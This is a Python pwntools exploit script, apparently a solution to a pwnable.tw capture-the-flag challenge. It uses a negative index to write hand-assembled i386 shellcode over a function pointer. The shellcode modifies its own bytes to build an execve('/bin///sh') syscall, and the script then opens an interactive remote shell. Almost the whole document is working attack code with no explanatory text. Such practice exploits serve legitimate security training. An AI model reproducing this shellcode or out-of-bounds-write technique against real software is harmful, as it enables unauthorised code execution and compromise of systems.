#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = process('/tmp/p/a')
r = remote('chall.pwnable.tw', 10201)
def add_name(idx, name):
	r.sendlineafter(':', str(1))
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', name)

def show_name(idx):
	r.sendlineafter(':', str(2))
	r.sendlineafter(':', str(idx))

def delete_name(idx):
	r.sendlineafter(':', str(3))
	r.sendlineafter(':', str(idx))

payload = asm('''

push 0x68           /*  h  		*/
push 0x732f2f2f 	/*  ///s  	*/
push 0x6e69622f 	/*  /bin    */

push esp
pop ebx 			/*set ebx to '/bin///sh'*/

dec edx
dec edx 
xor [eax+32],dl 
xor [eax+33],dl 

inc edx
inc edx
push edx
push edx
pop ecx 
push 0x40
pop eax
xor al,0x4b 

''')+'\x33\x7e'

raw_input("#")
add_name(-19, payload)
delete_name(-19)


r.interactive()